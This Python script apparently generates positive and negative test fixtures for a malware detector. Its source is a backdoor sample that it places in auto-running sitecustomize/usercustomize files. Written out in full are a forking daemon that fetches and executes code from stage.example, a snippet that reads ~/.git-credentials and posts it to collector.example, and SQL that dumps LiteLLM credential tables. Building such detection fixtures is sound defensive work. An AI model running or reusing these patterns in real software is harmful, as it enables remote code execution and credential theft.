#!/usr/bin/env python3
"""Rebuild focused controls in the cleave fixture tree from the article sample."""
from pathlib import Path
import json
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('--fixtures', type=Path, required=True)
parser.add_argument('--sample', type=Path, required=True)
args = parser.parse_args()
base = args.fixtures
base.mkdir(parents=True, exist_ok=True)
sample = args.sample.read_text()
# Controls live in cleave's fixtures, never in the article's sample directory.
(base/'positive').mkdir(exist_ok=True)
(base/'positive'/'sitecustomize.py').write_text(sample)
renamed=sample.replace('fetch_text','download_source').replace('exec_code','activate').replace('code = await','material = await').replace('exec_code(code)','exec_code(material)').replace('activate(code)\n','activate(material)\n')
# Rename parameters and all their bound uses together, including the executor.
renamed=renamed.replace('async def activate(code):','async def activate(source):').replace("compile(code, '<remote>'","compile(source, '<remote>'").replace('requests','httpx').replace('letters9813/pythonclient-test','example/rotated').replace('www.litellm.dev','collector.example').replace('codepy','next-stage')
(base/'positive'/'usercustomize.py').write_text(renamed)
(base/'plugin.py').write_text(sample.replace("daemon(serialization.load_pem_public_key(PC_PUBKEY))",''))
# Both neutral helper matchers must survive free renaming of local identifiers.
(base/'helper_renamed.py').write_text(sample.replace('_q','perform_sql').replace('async def perform_sql(db, sql):\n    return await db.query_raw(sql)','async def perform_sql(connection, statement):\n    return await connection.query_raw(statement)'))
variants={
 'overwritten.py':sample.replace("    await exec_code(code)","    code = 'print(42)'\n    await exec_code(code)"),
 'different_value.py':sample.replace('await exec_code(code)','await exec_code("print(42)")'),
 'different_helper.py':sample.replace('await exec_code(code)','await save_code(code)'),
 'not_http.py':sample.replace('requests.get, url','read_config, url'),
 'compile_only.py':sample.replace("exec(compile(code, '<remote>', 'exec'), globals())","return compile(code, '<remote>', 'exec')"),
 'wrong_mode.py':sample.replace("compile(code, '<remote>', 'exec')","compile(code, '<remote>', 'eval')"),
 'db_wrong_parameter.py':sample.replace('return await db.query_raw(sql)','return await db.query_raw("SELECT 1")'),
 'db_wrong_helper.py':sample.replace('creds = await _q(','creds = await logger(').replace('models = await _q(','models = await logger('),
 'db_other_tables.py':sample.replace('LiteLLM_CredentialsTable','LiteLLM_CredentialsTableArchive').replace('LiteLLM_ProxyModelTable','LiteLLM_ProxyModelTableBackup'),
 'db_comment.py':sample.replace('db, \'SELECT "credential_name", "credential_values" \'','db, \'Explain SELECT "credential_name", "credential_values" \'').replace('db, \'SELECT "model_name", "litellm_params" \'','db, \'Explain SELECT "model_name", "litellm_params" \''),
}
for name,s in variants.items():(base/name).write_text(s)
(base/'comments.py').write_text('\n'.join('# '+s for s in sample.splitlines())+'\n')
(base/'quoted.py').write_text('DESCRIPTION = '+repr(sample)+'\n')
queries=['SELECT "credential_name", "credential_values" FROM "LiteLLM_CredentialsTable" LIMIT 500',
         'SELECT "model_name", "litellm_params" FROM "LiteLLM_ProxyModelTable" LIMIT 500']
# Same schema and SQL operations across OS-portable database clients.
for suffix in ['py','js','ts','rb','php','go','java']:
 q=[json.dumps(x) for x in queries]
 if suffix=='py':s='def backup(db):\n    db.query_raw('+q[0]+')\n    db.execute('+q[1]+')\n'
 elif suffix in ['js','ts']:s='async function backup(db) {\n await db.queryRaw('+q[0]+');\n await db.query('+q[1]+');\n}\n'
 elif suffix=='rb':s='def backup(db)\n db.execute('+q[0]+')\n db.query('+q[1]+')\nend\n'
 elif suffix=='php':s='<?php\nfunction backup($db) {\n $db->query('+q[0]+');\n $db->query('+q[1]+');\n}\n'
 elif suffix=='go':s='package main\nimport "database/sql"\nfunc backup(db *sql.DB) {\n db.Query('+q[0]+')\n db.Query('+q[1]+')\n}\n'
 else:s='class Backup { void backup(java.sql.Statement db) throws Exception {\n db.executeQuery('+q[0]+');\n db.executeQuery('+q[1]+');\n}}\n'
 (base/f'backup.{suffix}').write_text(s)
for name,qs in {
 'count.py':[f'SELECT COUNT(*) FROM "{t}"' for t in ['LiteLLM_CredentialsTable','LiteLLM_ProxyModelTable']],
 'prefix.py':[x.replace('Table','TableArchive') for x in queries],
 'other_table.py':[x.replace('LiteLLM_CredentialsTable','users').replace('LiteLLM_ProxyModelTable','models') for x in queries],
 'query_prose.py':['Explain '+x for x in queries],
}.items():
 (base/name).write_text('\n'.join('db.query('+repr(q)+')' for q in qs)+'\n')
(base/'log_sql.py').write_text('\n'.join('logger('+repr(q)+')' for q in queries)+'\n')
(base/'star.py').write_text('db.execute(\'SELECT * FROM "LiteLLM_CredentialsTable"\')\ndb.query(\'SELECT * FROM "LiteLLM_ProxyModelTable"\')\n')

s = (base/'backup.php').read_text()
(base/'php_prose.php').write_text(s.replace('SELECT', 'Explain SELECT'))
(base/'php_count.php').write_text(s.replace('\\"credential_name\\", \\"credential_values\\"', 'COUNT(*)').replace('\\"model_name\\", \\"litellm_params\\"', 'COUNT(*)'))
(base/'php_prefix.php').write_text(s.replace('Table', 'TableArchive'))
(base/'php_logger.php').write_text(s.replace('$db->query', 'logger'))
(base/'negative').mkdir(exist_ok=True)
(base/'negative'/'sitecustomize.py').write_text((base/'overwritten.py').read_text())
(base/'plain.py##plain@0x10').write_text('#!/usr/bin/env python3\n' + (base/'plugin.py').read_text())
old = """#!/usr/bin/env python3
import asyncio
import os
import requests
loop = asyncio.get_event_loop()
async def execute(source):
    await loop.run_in_executor(None, lambda: exec(compile(source, '<stage>', 'exec')))
async def poll():
    while True:
        try:
            body = requests.get('https://stage.example/worker').text
            await execute(body)
        except Exception:
            pass
os.fork()
os.setsid()
"""
(base/'old_compiled_daemon.py').write_text(old)
(base/'old_compiled.py##plain@0x20').write_text(old)
export = """import requests
home = '/home/operator'
with open(home + '/.git-credentials', 'rb') as f:
    data = f.read()
requests.post('https://collector.example/upload', data=data)
"""
(base/'git_export.py').write_text(export)
(base/'git_read_only.py').write_text(export[:export.index('requests.post')])
(base/'dynamic_codecs.py').write_text("imported = [__import__('base64'), __import__('zlib')]\n")
(base/'codec_comment.py').write_text("# __import__('base64') and __import__('zlib')\nvalue = 1\n")
(base/'codec_literal.py').write_text("template = \"__import__('base64'); __import__('zlib')\"\n")
(base/'wrong_codecs.py').write_text("imported = [__import__('json'), __import__('gzip')]\n")
